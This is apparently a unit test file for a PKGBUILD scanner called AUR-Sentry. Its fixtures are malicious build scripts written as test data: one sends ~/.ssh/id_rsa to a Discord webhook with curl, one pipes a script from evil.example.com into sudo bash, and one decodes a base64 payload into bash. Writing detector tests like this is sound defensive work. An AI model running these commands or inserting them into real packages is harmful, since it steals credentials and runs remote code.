"""
Tests for AUR-Sentry static analysis engine.
"""

from __future__ import annotations

import unittest
from src.scanner import PKGBUILDScanner


class TestPKGBUILDScanner(unittest.TestCase):
    def setUp(self) -> None:
        self.popular_packages = ["google-chrome", "visual-studio-code-bin", "spotify", "discord"]
        self.scanner = PKGBUILDScanner(popular_packages=self.popular_packages)

    def test_benign_pkgbuild_passes(self) -> None:
        benign_pkgbuild = """
# Maintainer: John Doe <john@example.com>
pkgname=foot-terminal
pkgver=1.16.2
pkgrel=1
pkgdesc="A fast, lightweight and minimalistic Wayland terminal emulator"
arch=('x86_64' 'aarch64')
url="https://codeberg.org/dnkl/foot"
license=('MIT')
depends=('wayland' 'pixman' 'fontconfig')
makedepends=('meson' 'ninja' 'wayland-protocols')
source=("https://codeberg.org/dnkl/foot/releases/download/${pkgver}/foot-${pkgver}.tar.gz")
sha256sums=('38865ecdfca86427382218086ee50a12e259e875155f949c81b539b4bfa254ff')

build() {
    arch-meson foot-${pkgver} build
    ninja -C build
}

package() {
    DESTDIR="${pkgdir}" ninja -C build install
}
"""
        findings = self.scanner.scan_pkgbuild(benign_pkgbuild, pkgname="foot-terminal")
        self.assertEqual(len(findings), 0)

    def test_obfuscated_base64_payload(self) -> None:
        malicious = """
pkgname=cool-theme
pkgver=1.0
pkgrel=1
source=("theme.tar.gz")
sha256sums=('SKIP')

prepare() {
    echo "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldA==" | base64 -d | bash
}
"""
        findings = self.scanner.scan_pkgbuild(malicious, pkgname="cool-theme")
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("RULE_OBFUSCATED_BASE64", rule_ids)
        self.assertIn("RULE_SKIP_HASH_REMOTE", rule_ids)

    def test_raw_ip_download(self) -> None:
        malicious = """
pkgname=super-driver
pkgver=2.0
pkgrel=1
source=("http://192.168.1.100:8080/driver.bin")
sha256sums=('1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef')
"""
        findings = self.scanner.scan_pkgbuild(malicious, pkgname="super-driver")
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("RULE_RAW_IP_DOWNLOAD", rule_ids)

    def test_discord_webhook_exfil(self) -> None:
        malicious = """
pkgname=hacked-calc
pkgver=1.0
pkgrel=1
package() {
    curl -H "Content-Type: application/json" -d "{\\"content\\":\\"$(cat ~/.ssh/id_rsa)\\"}" \\
        https://discord.com/api/webhooks/1234567890/AbCdEfGhIjKlMnOpQrStUvWxYz
}
"""
        findings = self.scanner.scan_pkgbuild(malicious, pkgname="hacked-calc")
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("RULE_DISCORD_WEBHOOK", rule_ids)
        self.assertIn("RULE_SENSITIVE_FS_ACCESS", rule_ids)

    def test_curl_pipe_bash(self) -> None:
        malicious = """
pkgname=quick-installer
pkgver=1.0
prepare() {
    curl -fsSL https://evil.example.com/install.sh | sudo bash
}
"""
        findings = self.scanner.scan_pkgbuild(malicious, pkgname="quick-installer")
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("RULE_CURL_PIPE_EXEC", rule_ids)

    def test_typosquatting_detection(self) -> None:
        content = "pkgname=goolge-chrome\npkgver=1.0\n"
        findings = self.scanner.scan_pkgbuild(content, pkgname="goolge-chrome")
        rule_ids = [f.rule_id for f in findings]
        self.assertIn("RULE_TYPOSQUATTING", rule_ids)


if __name__ == "__main__":
    unittest.main()
